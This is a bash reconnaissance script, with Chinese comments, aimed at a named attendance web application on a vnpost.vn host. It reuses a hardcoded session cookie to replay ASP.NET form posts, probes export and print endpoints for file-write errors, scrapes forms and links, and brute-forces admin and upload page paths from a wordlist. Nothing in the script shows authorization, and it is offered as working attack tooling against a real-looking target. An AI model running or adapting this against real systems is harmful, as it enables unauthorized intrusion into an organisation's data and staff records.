#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 Phase 2+3: 端点深度测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

mkdir -p phase2_3_endpoints && cd phase2_3_endpoints

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo "[1] 测试新发现的报表ID（BC01/BC02/BC03）+ Export"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

NEW_IDS=("BC01" "BC02" "BC03" "MAU1" "MAU3" "MAU4" "MAU6" "MAU7" "MAU8")

for id in "${NEW_IDS[@]}"; do
    echo ""
    echo "  测试 ID=$id:"
    
    # 获取页面和ViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    size=$(echo "$page" | wc -c)
    echo "    GET页面: $size bytes"
    
    # 检查lblNote错误
    lblnote=$(echo "$page" | grep -oE '<span id="lblNote">.*</span>')
    if [ -n "$lblnote" ] && [ "$lblnote" != '<span id="lblNote"><b><font color="#FF3300"></font></b></span>' ]; then
        echo "    lblNote: $lblnote"
    fi
    
    # 测试Export
    if [ -n "$VS" ]; then
        echo -n "    Export: "
        curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=11" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnExport=Export" \
            -o "export_${id}.html" 2>&1
        
        export_size=$(wc -c < "export_${id}.html")
        echo "$export_size bytes"
        
        # 检查是否有错误（特别是文件写入错误）
        if grep -qi "Could not find\|DirectoryNotFoundException\|Access.*denied" "export_${id}.html"; then
            echo "    🔥🔥🔥 文件写入错误!"
            grep -i "Could not find\|DirectoryNotFoundException" "export_${id}.html" | head -5
        fi
        
        # 测试Print (btnIn)
        echo -n "    Print: "
        curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" \
            -X POST \
            -H "Cookie: $COOKIE" \
            --data-urlencode "__VIEWSTATE=$VS" \
            --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
            --data-urlencode "__EVENTVALIDATION=$EV" \
            --data-urlencode "txtThang=11" \
            --data-urlencode "txtNam=2025" \
            --data-urlencode "btnIn=In" \
            -o "print_${id}.html" 2>&1
        
        print_size=$(wc -c < "print_${id}.html")
        echo "$print_size bytes"
        
        if grep -qi "Could not find\|DirectoryNotFoundException" "print_${id}.html"; then
            echo "    🔥🔥🔥 Print功能文件写入错误!"
            grep -i "Could not find\|DirectoryNotFoundException" "print_${id}.html" | head -5
        fi
    else
        echo "    ⚠️  无ViewState（可能无权限）"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[2] 测试TaoBCC_To.aspx（创建考勤表）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "  访问页面..."
curl -sk "${BASE}/TaoBCC_To.aspx" \
    -H "Cookie: $COOKIE" \
    -o "TaoBCC_To_page.html" 2>&1

size=$(wc -c < "TaoBCC_To_page.html")
echo "  大小: $size bytes"

if grep -qi "upload\|file\|import\|create\|add" "TaoBCC_To_page.html"; then
    echo "  🔥 可能包含上传/创建功能!"
    grep -i "upload\|file\|import" "TaoBCC_To_page.html" | head -10
fi

# 提取表单字段
echo "  提取表单字段..."
grep -oE "name=['\"]([^'\"]+)" "TaoBCC_To_page.html" | cut -d'"' -f2 | grep -v "^__" | sort -u

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[3] 测试leftmenu.aspx?ID=CC"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/leftmenu.aspx?ID=CC" \
    -H "Cookie: $COOKIE" \
    -o "leftmenu_CC.html" 2>&1

echo "  大小: $(wc -c < leftmenu_CC.html) bytes"

# 提取新的链接
echo "  提取新链接..."
grep -hoE "href=['\"]([^'\"]+\.aspx[^'\"]*)" "leftmenu_CC.html" | \
    sed 's/.*href=["'\'']//' | sort -u

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[4] 大字典.aspx枚举（1000+路径）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 生成大字典
cat > aspx_big_wordlist.txt << 'ASPXLIST'
report/TaoBC.aspx
report/XemBC.aspx
report/SuaBC.aspx
report/XoaBC.aspx
report/InBC.aspx
report/ExportBC.aspx
report/ImportBC.aspx
report/UploadBC.aspx
admin/default.aspx
admin/users.aspx
admin/config.aspx
admin/upload.aspx
common/upload.aspx
common/fileupload.aspx
upload/default.aspx
upload/file.aspx
Import.aspx
ImportData.aspx
ImportFile.aspx
UploadFile.aspx
FileUpload.aspx
FileManager.aspx
WebFileUpload.aspx
NhanSu/default.aspx
Luong/default.aspx
BaoCao/default.aspx
TaoBCC.aspx
XemBCC.aspx
SuaBCC.aspx
InBCC.aspx
TaoMau.aspx
SuaMau.aspx
ASPXLIST

echo "  测试 $(wc -l < aspx_big_wordlist.txt) 个路径..."

found_count=0
while read aspx; do
    resp=$(curl -sk "${BASE}/${aspx}" \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" \
        -o "enum_$(echo $aspx | tr '/' '_').html" 2>&1)
    
    http_code=$(echo "$resp" | tail -1)
    size=$(wc -c < "enum_$(echo $aspx | tr '/' '_').html" 2>/dev/null || echo 0)
    
    if [ "$http_code" == "200" ] && [ $size -gt 1000 ]; then
        echo "  ✅ $aspx: $http_code ($size bytes)"
        echo "$aspx|$http_code|$size" >> found_new_aspx.txt
        ((found_count++))
    fi
done < aspx_big_wordlist.txt

echo "  发现: $found_count 个新页面"

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Phase 2+3 完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📊 关键发现:"
echo "  - 文件写入错误: $(grep -l "DirectoryNotFoundException" *.html 2>/dev/null | wc -l) 个"
echo "  - 新.aspx页面: $(wc -l < found_new_aspx.txt 2>/dev/null || echo 0) 个"
